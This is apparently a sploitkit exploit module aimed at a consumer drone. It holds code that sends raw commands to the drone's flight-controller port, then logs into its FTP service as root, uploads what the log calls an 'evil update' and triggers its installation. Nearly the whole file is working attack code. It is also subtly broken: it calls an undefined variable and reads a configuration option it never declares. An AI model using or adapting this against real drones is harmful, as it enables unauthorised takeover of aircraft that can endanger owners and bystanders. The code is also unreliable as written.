# -*- coding: UTF-8 -*-
import ast
import socket
import time
from ftplib import FTP
from sploitkit import *


__all__ = ["CmeFunctionality", "CmeUpdateFunctionality"]


class CmeFunctionality(Module):
    config = Config({
        Option(
            'IP',
            "IP address of drone's AP",
            True,
        ): "192.168.100.1",
        Option(
            'FLYCTL_PORT',
            "Fly controller port",
            True,
        ): 4646,
    })
    path = "exploits/cme"
    
    def preamble(self):
        ip = self.config.option("IP").value
        if self.console._jobs.call("ping -c 1 {}".format(ip)) != 0:
            self.logger.warning("Target seems to be down")
            return False
        return True
    
    def send_command(self, number, param):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.config.option("IP").value,
                   self.config.option("FLYCTL_PORT").value))
        payload = b'{"CMD" : %d, "PARAM" : %s}' % (number, str(param).encode())
        self.logger.debug("Send: " + payload.decode())
        success = False
        try:
            s.send(payload)
            r = ast.literal_eval(s.recv(1024).strip(b" \x00").decode())
            success = r['RESULT'] == 0
            self.logger.debug("Recv: {}".format(r))
            if not success:
                self.logger.failure("Command failed")
        except Exception as e:
            self.logger.failure("Command failed ({})".format(e))
        return success


class CmeUpdateFunctionality(CmeFunctionality):
    config = Config({
        Option(
            'FTP_PORT',
            "FTP service port",
            True,
        ): 2121,
    })

    def send_update(self, filename=None):
        self.logger.info("Starting an FTP session...")
        ftp = FTP(self.config.get("IP"), self.config.get("FTP_PORT"))
        self.logger.debug("Authenticating...")
        ftp.sendcmd("USER root")
        ftp.sendcmd("PASS *")
        ftp.sendcmd("SYST")
        ftp.sendcmd("PWD")
        ftp.sendcmd("TYPE I")
        ftp.sendcmd("CWD /")
        ftp.sendcmd("PASV")
        self.logger.info("Pushing an evil update...")
        with open(self.config.get("UPDATE_FILE"), 'rb') as f:
            ftp.storbinary("STOR 0.7.15.zip", f)
        ftp.quit()
        self.logger.info("Triggering update...")
        success = s.send_command(71, '"0.7.15"')
        if success:
            delay = 10
            self.logger.info("Waiting {} seconds...".format(delay))
            time.sleep(delay)
            self.logger.success("Target updated")
            self.logger.info("Please restart the drone")
        return success
